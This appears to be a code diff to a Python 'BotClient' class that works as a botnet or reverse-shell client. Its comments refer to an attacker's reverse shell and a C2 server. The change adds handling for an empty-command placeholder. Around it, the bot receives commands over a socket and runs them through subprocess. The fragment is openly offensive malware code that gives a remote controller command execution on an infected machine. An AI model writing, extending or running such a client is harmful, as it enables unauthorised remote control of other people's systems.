@@ -53,6 +53,11 @@ class BotClient:
 
         # keep the port open for as long as the attacker doesn't exit the reverse shell
         while command != "exit":
+            if command.strip() == "this_is_empty":
+                # If the command is empty, send a message to the C2 server and wait for the next command
+                self.client_socket.sendall("Empty command received".encode())
+                command = (self.client_socket.recv(4064)).decode()
+                continue
             try:
                 # create a subprocess using the run method and pass the command to the subprocess
                 result = run(command.split(" "), capture_output=True)
